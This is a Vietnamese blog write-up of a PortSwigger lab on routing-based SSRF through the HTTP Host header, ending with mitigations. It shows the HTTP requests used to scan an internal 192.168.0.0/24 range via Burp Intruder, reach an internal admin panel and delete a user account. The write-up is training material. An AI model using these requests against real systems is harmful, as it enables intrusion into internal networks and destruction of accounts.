---
title: "[PortSwigger] Lab 4: Routing-Based SSRF"
date: 2026-09-14
description: "Khai thác lỗ hổng Server-Side Request Forgery (SSRF) dựa trên cơ chế định tuyến của Reverse Proxy thông qua header Host để quét và xâm nhập mạng nội bộ."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 4
showAuthor: false
showTableOfContents: true
---

## Thông tin bài Lab
* **Tên bài Lab**: Routing-based SSRF
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Practitioner
* **Mục tiêu**: Sử dụng header `Host` để quét dải mạng nội bộ `192.168.0.0/24`, xác định máy chủ quản trị và xóa tài khoản `carlos`.

---

## 1. Kiến thức nền tảng

Trong kiến trúc hệ thống hiện đại, một Reverse Proxy đứng phía trước thường chuyển tiếp request đến các backend server dựa trên thông tin định tuyến trong header `Host`.

Nếu Reverse Proxy được cấu hình lỏng lẻo cho phép định tuyến tới bất kỳ địa chỉ nào được chỉ định trong header `Host`, kẻ tấn công có thể biến Reverse Proxy thành một bàn đạp để gửi request vào sâu bên trong mạng nội bộ (*Routing-based SSRF*).

---

## 2. Mô hình tấn công

```text
[Attacker] ---> [Reverse Proxy] ---> [Internal IP: 192.168.0.X]
   Request: Host: 192.168.0.X
```

Proxy phân giải và kết nối trực tiếp đến IP được cung cấp trong header `Host` thay vì chuyển tiếp đến backend server mặc định.

---

## 3. Khai thác lỗ hổng

### Bước 1: Quét dải mạng nội bộ qua Burp Intruder
Gửi request truy cập trang chủ sang **Intruder**:
```http
GET /admin HTTP/1.1
Host: 192.168.0.§1§
...
```

1. Chọn kiểu tấn công: **Sniper**.
2. Đặt Payload loại: **Numbers** từ `1` đến `255`, bước nhảy `1`.
3. Bắt đầu tấn công và theo dõi HTTP status code. Hầu hết các IP sẽ trả về `504 Gateway Timeout` hoặc `404`, ngoại trừ một IP trả về `200 OK` hoặc `302 Found`.

### Bước 2: Truy cập trang quản trị nội bộ
Giả sử tìm thấy IP nội bộ là `192.168.0.123`:
```http
GET /admin HTTP/1.1
Host: 192.168.0.123
```

Nhận phản hồi `200 OK` chứa form quản trị viên.

### Bước 3: Gửi lệnh xóa tài khoản `carlos`
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.123
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

csrf=...&username=carlos
```
Bài lab hoàn thành!

---

## 4. Biện pháp khắc phục
* **Thiết lập Forwarding Whitelist**: Chỉ cho phép Reverse Proxy chuyển tiếp request đến một danh sách backend IP cố định đã được định cấu hình sẵn.
* **Ngăn chặn Private IP Routing**: Cấu hình proxy từ chối định tuyến tới các dải IP riêng tư (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`).
